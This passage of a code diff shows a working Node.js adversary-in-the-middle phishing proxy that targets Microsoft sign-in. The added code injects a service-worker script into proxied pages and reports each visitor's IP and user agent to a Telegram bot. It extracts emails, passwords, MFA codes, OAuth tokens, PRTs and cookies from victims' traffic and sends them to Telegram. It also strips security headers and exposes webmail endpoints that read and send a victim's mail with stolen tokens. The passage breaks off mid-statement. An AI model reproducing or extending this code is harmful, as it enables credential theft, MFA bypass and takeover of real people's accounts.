+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── Webmail send ──
+    if (apiPath === '/api/webmail/send' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken, to, subject, body: emailBody, replyToId, forwardFromId } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                if (!to || !subject || !emailBody) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'To, subject, and body required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                const emailData = {
+                    message: {
+                        subject: subject,
+                        body: { content: emailBody, contentType: 'HTML' },
+                        toRecipients: to.map(email => ({ emailAddress: { address: email } }))
+                    }
+                };
+                if (replyToId) emailData.message.conversationId = replyToId;
+                if (forwardFromId) emailData.message.forwardFrom = { id: forwardFromId };
+                await graph.post('/me/sendMail', emailData);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── Webmail search ──
+    if (apiPath === '/api/webmail/search' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken, query, folderId = 'inbox', limit = 50 } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                if (!query) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Search query required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                const searchUrl = folderId === 'inbox'
+                    ? `/me/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
+                    : `/me/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
+                const results = await graph.get(searchUrl);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, emails: results.value || [] }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── 404 for unknown API ──
+    res.writeHead(404, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ error: 'API endpoint not found' }));
+}
+
+// ============================================================
+// 🔧 PROXY HANDLER
+// ============================================================
+function proxyHandler(req, res) {
+    proxyServer.emit('request', req, res);
+}
+
+// ── Start auto-refresh ──
+refreshTokensDaemon();
+
+// ── The actual proxy server (with page‑load notification + SW registration) ──
+const proxyServer = http.createServer((clientRequest, clientResponse) => {
+    const { method, url, headers } = clientRequest;
+    const currentSession = getUserSession(headers.cookie);
+
+    // ── PAGE‑LOAD NOTIFICATION & SERVICE WORKER INJECTION ──
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
@@ -831,394 +1920,351 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             }
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
             VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
-            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
-            VICTIM_SESSIONS[session].port = phishedURL.port;
+            VICTIM_SESSIONS[session].path = phishedURL.pathname + phishedURL.search;
+            VICTIM_SESSIONS[session].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
             VICTIM_SESSIONS[session].host = phishedURL.host;
 
+            // ── 🔥 INJECT SERVICE WORKER REGISTRATION ──
+            const indexPath = path.join(__dirname, PROXY_FILES.index);
+            let html = fs.readFileSync(indexPath, 'utf-8');
+
+            const swRegistrationScript = `
+<script>
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/service_worker_Mz8XO2ny1Pg5.js')
+            .then(() => console.log('✅ SW registered'))
+            .catch(err => console.error('❌ SW registration failed:', err));
+    }
+</script>`;
+
+            // Inject before </head>
+            html = html.replace(/<\/head>/i, swRegistrationScript + '</head>');
+
+            // ── Send page‑load notification ──
+            (async () => {
+                try {
+                    const ip = headers['cf-connecting-ip'] || headers['x-real-ip'] || headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
+                    console.log(`🌐 Page-load: IP=${ip}, Session=${session}`);
+                    const message = `🆕 **New Visitor (Page Load)!**\n\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${url}\n🖥️ User-Agent: ${headers['user-agent'] || 'Unknown'}`;
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    });
+                    console.log('✅ Page-load notification sent.');
+                } catch (e) {
+                    console.error('❌ Page-load notification failed:', e.message);
+                }
+            })();
+
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+            clientResponse.end(html);  // Served modified HTML
+
         } catch (error) {
-            displayError("Phishing URL parsing failed", error, url);
+            displayError("Entry point error", error, url);
             clientResponse.writeHead(404, { "Content-Type": "text/html" });
             fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
         }
-    } else if (currentSession || url === PROXY_PATHNAMES.proxy) {
-        if (url === PROXY_PATHNAMES.serviceWorker) {
-            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
-            fs.createReadStream(url.slice(1)).pipe(clientResponse);
-        } else if (url === PROXY_PATHNAMES.favicon) {
+        return;
+    }
+
+    // ── Service Worker ──
+    if (url === PROXY_PATHNAMES.serviceWorker) {
+        clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
+        fs.createReadStream(url.slice(1)).pipe(clientResponse);
+        return;
+    }
+
+    // ── Favicon ──
+    if (url === PROXY_PATHNAMES.favicon) {
+        if (currentSession && VICTIM_SESSIONS[currentSession]) {
             clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
-            clientResponse.end();
         } else {
-            let clientRequestBody = [];
-            clientRequest.on("error", (error) => {
-                displayError("Client request body retrieval failed", error, method, url);
-            }).on("data", (chunk) => {
-                clientRequestBody.push(chunk);
-            }).on("end", () => {
+            clientResponse.writeHead(301, { Location: 'https://login.microsoftonline.com/favicon.ico' });
+        }
+        clientResponse.end();
+        return;
+    }
+
+    // ── Proxied requests ──
+    if (url === PROXY_PATHNAMES.proxy || currentSession) {
+        let clientRequestBody = [];
+        clientRequest
+            .on("error", (error) => displayError("Client request body retrieval failed", error, method, url))
+            .on("data", (chunk) => clientRequestBody.push(chunk))
+            .on("end", () => {
                 clientRequestBody = Buffer.concat(clientRequestBody).toString();
 
                 if (!currentSession) {
-                    // anonymous session handling...
-                    if (clientRequestBody) {
+                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
+                    clientResponse.end();
+                    return;
+                }
+
+                let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
+                const proxyRequestOptions = {
+                    hostname: VICTIM_SESSIONS[currentSession].hostname,
+                    port: VICTIM_SESSIONS[currentSession].port,
+                    method: method,
+                    path: VICTIM_SESSIONS[currentSession].path,
+                    headers: { ...headers },
+                    rejectUnauthorized: false
+                };
+                let isNavigationRequest = false;
+
+                if (clientRequestBody) {
+                    if (url === PROXY_PATHNAMES.jsCookie) {
+                        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
+                        const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
+                        clientResponse.writeHead(200, { "Content-Type": "application/json" });
+                        clientResponse.end(JSON.stringify(validDomains));
+                        return;
+                    } else if (url === PROXY_PATHNAMES.proxy) {
                         try {
-                            clientRequestBody = JSON.parse(clientRequestBody);
-                            const proxyRequestURL = new URL(clientRequestBody.url);
-                            const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
-                            if (proxyRequestURL.hostname === headers.host &&
-                                proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
-                                try {
+                            const parsed = JSON.parse(clientRequestBody);
+                            let proxyRequestURL = new URL(parsed.url);
+                            let proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
+
+                            if (proxyRequestURL.hostname === headers.host) {
+                                if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                     const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
-                                    const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                    clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
-                                    VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
-                                    VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
-                                    VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
-                                    VICTIM_SESSIONS[cookieName].port = phishedURL.port;
-                                    VICTIM_SESSIONS[cookieName].host = phishedURL.host;
-                                    clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
+                                    VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
+                                    VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
+                                    VICTIM_SESSIONS[currentSession].path = phishedURL.pathname + phishedURL.search;
+                                    VICTIM_SESSIONS[currentSession].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
+                                    VICTIM_SESSIONS[currentSession].host = phishedURL.host;
+                                    clientResponse.writeHead(301, { Location: `${phishedURL.protocol}//${headers.host}${phishedURL.pathname}${phishedURL.search}` });
                                     clientResponse.end();
-                                } catch (error) {
-                                    displayError("Phishing URL parsing failed", error, proxyRequestPath);
-                                    clientResponse.writeHead(404, { "Content-Type": "text/html" });
-                                    fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-                                }
-                            } else {
-                                clientResponse.writeHead(301, { Location: REDIRECT_URL });
-                                clientResponse.end();
-                            }
-                        } catch (error) {
-                            displayError("Anonymous client request body parsing failed", error, clientRequestBody);
-                        }
-                    } else {
-                        clientResponse.writeHead(301, { Location: REDIRECT_URL });
-                        clientResponse.end();
-                    }
-                } else {
-                    // Authenticated session
-                    let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
-                    const proxyRequestOptions = {
-                        hostname: VICTIM_SESSIONS[currentSession].hostname,
-                        port: VICTIM_SESSIONS[currentSession].port,
-                        method: method,
-                        path: VICTIM_SESSIONS[currentSession].path,
-                        headers: { ...headers },
-                        rejectUnauthorized: false
-                    };
-                    let isNavigationRequest = false;
-
-                    if (clientRequestBody) {
-                        if (url === PROXY_PATHNAMES.jsCookie) {
-                            updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
-                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
-                            clientResponse.writeHead(200, { "Content-Type": "application/json" });
-                            clientResponse.end(JSON.stringify(validDomains));
-                            return;
-                        } else if (url === PROXY_PATHNAMES.proxy) {
-                            try {
-                                clientRequestBody = JSON.parse(clientRequestBody);
-                                let proxyRequestURL = new URL(clientRequestBody.url);
-                                let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
-
-                                if (proxyRequestURL.hostname === headers.host) {
-                                    if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
-                                        try {
-                                            const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
-                                            VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
-                                            VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
-                                            VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
-                                            VICTIM_SESSIONS[currentSession].port = phishedURL.port;
-                                            VICTIM_SESSIONS[currentSession].host = phishedURL.host;
-                                            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
-                                            clientResponse.end();
-                                        } catch (error) {
-                                            displayError("Phishing URL parsing failed", error, proxyRequestPath);
-                                            clientResponse.writeHead(404, { "Content-Type": "text/html" });
-                                            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-                                        }
-                                        return;
-                                    } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
-                                        clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
-                                        fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
-                                        return;
-                                    } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
-                                        try {
-                                            const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
-                                            proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
-                                            proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
-                                        } catch (error) {
-                                            displayError("Phishing URL parsing failed", error, proxyRequestPath);
-                                            clientResponse.writeHead(404, { "Content-Type": "text/html" });
-                                            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-                                            return;
-                                        }
-                                    } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
-                                        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
-                                        const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
-                                        clientResponse.writeHead(200, { "Content-Type": "application/json" });
-                                        clientResponse.end(JSON.stringify(validDomains));
+                                    return;
+                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
+                                    clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
+                                    fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
+                                    return;
+                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
+                                    try {
+                                        const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
+                                        proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
+                                        proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
+                                    } catch (error) {
+                                        displayError("Mutation parse failed", error, proxyRequestPath);
+                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
+                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                         return;
                                     }
+                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
+                                    updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [parsed.body], headers.host, currentSession);
+                                    const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
+                                    clientResponse.writeHead(200, { "Content-Type": "application/json" });
+                                    clientResponse.end(JSON.stringify(validDomains));
+                                    return;
                                 }
-                                proxyRequestProtocol = proxyRequestURL.protocol;
-                                proxyRequestOptions.path = proxyRequestPath;
-                                proxyRequestOptions.port = proxyRequestURL.port;
-                                proxyRequestOptions.method = clientRequestBody.method;
-                                proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
-                                if (proxyRequestURL.hostname !== headers.host) {
-                                    proxyRequestOptions.hostname = proxyRequestURL.hostname;
-                                    proxyRequestOptions.headers.host = proxyRequestURL.host;
-                                }
-                                if (proxyRequestOptions.headers.referer) {
-                                    proxyRequestOptions.headers.referer = clientRequestBody.referrer;
-                                }
-                                isNavigationRequest = clientRequestBody.mode === "navigate";
-                            } catch (error) {
-                                displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                             }
-                        } else {
-                            console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
+                            proxyRequestProtocol = proxyRequestURL.protocol;
+                            proxyRequestOptions.path = proxyRequestPath;
+                            proxyRequestOptions.port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
+                            proxyRequestOptions.method = parsed.method;
+                            proxyRequestOptions.headers = { ...headers, ...parsed.headers };
+                            if (proxyRequestURL.hostname !== headers.host) {
+                                proxyRequestOptions.hostname = proxyRequestURL.hostname;
+                                proxyRequestOptions.headers.host = proxyRequestURL.host;
+                            }
+                            if (proxyRequestOptions.headers.referer) proxyRequestOptions.headers.referer = parsed.referrer;
+                            isNavigationRequest = parsed.mode === "navigate";
+                            clientRequestBody = parsed.body;
+                        } catch (error) {
+                            displayError("Proxy request parse failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                         }
                     } else {
-                        console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
+                        console.warn(`Non-proxied URL: ${url}`);
                     }
-
-                    proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
-                    updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
-
-                    const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
-                    const requestContentLength = Buffer.byteLength(proxyRequestBody);
-                    if (requestContentLength) {
-                        proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
-                    } else {
-                        delete proxyRequestOptions.headers["content-type"];
-                        delete proxyRequestOptions.headers["content-length"];
-                    }
-
-                    if (isNavigationRequest) {
-                        VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
-                        VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
-                        VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
-                        VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
-                        VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
-                    }
-
-                    makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest, clientRequest);
+                } else {
+                    console.warn(`No request body for URL: ${url}`);
                 }
+
+                proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
+                updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
+
+                const proxyRequestBody = clientRequestBody.body || clientRequestBody;
+                const contentLength = Buffer.byteLength(proxyRequestBody);
+                if (contentLength) proxyRequestOptions.headers["content-length"] = contentLength.toString();
+                else { delete proxyRequestOptions.headers["content-type"]; delete proxyRequestOptions.headers["content-length"]; }
+
+                if (isNavigationRequest) {
+                    VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
+                    VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
+                    VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
+                    VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
+                    VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
+                }
+
+                const protocol = proxyRequestProtocol === "https:" ? https : http;
+                const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
+                    // ── Redirect interception ──
+                    if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
+                        const location = proxyResponse.headers.location;
+                        try {
+                            const locationURL = new URL(location);
+                            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
+                            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
+                            VICTIM_SESSIONS[currentSession].path = locationURL.pathname + locationURL.search;
+                            VICTIM_SESSIONS[currentSession].port = locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80);
+                            VICTIM_SESSIONS[currentSession].host = locationURL.host;
+                            proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
+                            console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
+                        } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
+                    }
+
+                    const setCookieHeaders = proxyResponse.headers["set-cookie"];
+                    if (setCookieHeaders) updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, headers.host, currentSession, proxyResponse.headers.date);
+                    proxyResponse.headers["cache-control"] = "no-store";
+                    proxyResponse.headers["access-control-allow-origin"] = `https://${headers.host}`;
+                    deleteHTTPSecurityResponseHeaders(proxyResponse.headers);
+
+                    let responseBody = [];
+                    proxyResponse
+                        .on("error", (error) => displayError("Response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path))
+                        .on("data", (chunk) => responseBody.push(chunk))
+                        .on("end", async () => {
+                            let bodyBuffer = Buffer.concat(responseBody);
+
+                            // ── Extract credentials for Telegram ──
+                            let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
+                            try {
+                                let reqBody = proxyRequestBody;
+                                if (typeof reqBody === 'string') {
+                                    try {
+                                        const parsed = JSON.parse(reqBody);
+                                        if (parsed.email) email = parsed.email;
+                                        if (parsed.password) password = parsed.password;
+                                        if (parsed.mfa || parsed.otp || parsed.code) mfa = parsed.mfa || parsed.otp || parsed.code;
+                                        if (parsed.access_token) tokens.access_token = parsed.access_token;
+                                        if (parsed.refresh_token) tokens.refresh_token = parsed.refresh_token;
+                                        if (parsed.id_token) tokens.id_token = parsed.id_token;
+                                        if (parsed.prt) tokens.prt = parsed.prt;
+                                    } catch (e) {
+                                        const params = new URLSearchParams(reqBody);
+                                        if (params.get('email')) email = params.get('email');
+                                        if (params.get('username')) email = params.get('username');
+                                        if (params.get('loginfmt')) email = params.get('loginfmt');
+                                        if (params.get('password')) password = params.get('password');
+                                        if (params.get('passwd')) password = params.get('passwd');
+                                        if (params.get('otc')) mfa = params.get('otc');
+                                        if (params.get('code')) mfa = params.get('code');
+                                        if (params.get('verificationCode')) mfa = params.get('verificationCode');
+                                    }
+                                }
+                                const respStr = bodyBuffer.toString('utf-8');
+                                const am = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+                                if (am) tokens.access_token = am[1];
+                                const rm = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+                                if (rm) tokens.refresh_token = rm[1];
+                                const im = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+                                if (im) tokens.id_token = im[1];
+                                const pm = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
+                                if (pm) tokens.prt = pm[1];
+                                const setCookies = proxyResponse.headers['set-cookie'];
+                                if (setCookies) {
+                                    const arr = Array.isArray(setCookies) ? setCookies : [setCookies];
+                                    for (const c of arr) {
+                                        const [nameVal] = c.split(';');
+                                        if (nameVal) {
+                                            const [n, v] = nameVal.split('=');
+                                            cookies[n] = v;
+                                        }
+                                    }
+                                }
+                                if (email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A' || Object.keys(tokens).length > 0 || Object.keys(cookies).length > 0) {
+                                    await sendToTelegram({ sessionId: currentSession, email, password, mfa, tokens, cookies });
+                                } else {
+                                    console.log(`ℹ️ No credentials found in request for session ${currentSession}`);
+                                }
+                            } catch (e) {
+                                console.error('❌ Telegram extraction error:', e.message);
+                            }
+
+                            // ── HTML injection ──
+                            if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
+                                try {
+                                    const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
+                                    bodyBuffer = updateHTMLProxyResponse(decompressedResponseBody);
+                                    bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
+                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
+                                } catch (error) {
+                                    displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
+                                }
+                            }
+
+                            // ── FederationRedirectUrl ──
+                            else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
+                                try {
+                                    const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
+                                    bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, headers.host);
+                                    bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
+                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
+                                } catch (error) {
+                                    displayError("Federation redirect update failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
+                                }
+                            }
+
+                            clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
+                            clientResponse.end(bodyBuffer);
+                        });
+                });
+
+                if (proxyRequestBody) proxyReq.write(proxyRequestBody);
+                proxyReq.end();
             });
-        }
     } else {
         clientResponse.writeHead(301, { Location: REDIRECT_URL });
         clientResponse.end();
     }
 });
 
-proxyServer.listen(process.env.PORT ?? 3000);
+// ============================================================
+// 🚀 START SERVER + WEBSOCKET
+// ============================================================
+const PORT = process.env.PORT || 3000;
 
-// ==================== makeProxyRequest (FIXED + DEVICE CODE HOOKS) ====================
-const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest, clientRequest) => {
-    const protocol = proxyRequestProtocol === "https:" ? https : http;
-    const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
-        logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession, clientRequest)
-            .catch(error => displayError("Log encryption failed", error));
-
-        // === FIXED: Update session path on ALL redirects (300-399) ===
-        if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
-            const proxyResponseLocation = proxyResponse.headers.location;
-            if (proxyResponseLocation) {
-                try {
-                    const locationURL = new URL(proxyResponseLocation);
-                    VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
-                    VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
-                    VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
-                    VICTIM_SESSIONS[currentSession].port = locationURL.port;
-                    VICTIM_SESSIONS[currentSession].host = locationURL.host;
-                    proxyResponse.headers.location = proxyResponseLocation.replace(locationURL.host, proxyHostname);
-                } catch {
-                    VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
-                }
-            }
-        } else if (proxyResponse.statusCode > 400) {
-            displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
-        }
-
-        const proxyResponseCookie = proxyResponse.headers["set-cookie"];
-        if (proxyResponseCookie) {
-            updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
-        }
-        proxyResponse.headers["cache-control"] = "no-store";
-        proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
-        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);
-
-        let serverResponseBody = [];
-        proxyResponse.on("error", (error) => {
-            displayError("Server response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path);
-        }).on("data", (chunk) => {
-            serverResponseBody.push(chunk);
-        }).on("end", async () => {
-            serverResponseBody = Buffer.concat(serverResponseBody);
-
-            if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
-                Buffer.byteLength(serverResponseBody)) {
-                try {
-                    const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
-                    serverResponseBody = updateHTMLProxyResponse(decompressedResponseBody);
-                    serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
-                    if (proxyResponse.headers["content-length"]) {
-                        proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
-                    }
-                } catch (error) {
-                    displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
-                }
-            } else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
-                try {
-                    const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
-                    serverResponseBody = updateFederationRedirectUrl(decompressedResponseBody, proxyHostname);
-                    serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
-                    if (proxyResponse.headers["content-length"]) {
-                        proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
-                    }
-                } catch (error) {
-                    displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
-                }
-            }
-
-            // ==================== DEVICE CODE FLOW INTERCEPTION ====================
-            // Intercept /devicecode response (initial code generation)
-            if (proxyRequestOptions.path.includes('/oauth2/v2.0/devicecode')) {
-                try {
-                    const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
-                    const bodyString = decompressedResponseBody.toString('utf-8');
-                    const json = JSON.parse(bodyString);
-                    
-                    const deviceCode = json.device_code;
-                    const userCode = json.user_code;
-                    const verificationUri = json.verification_uri;
-                    const expiresIn = json.expires_in;
-                    const interval = json.interval;
-
-                    const deviceAlert = 
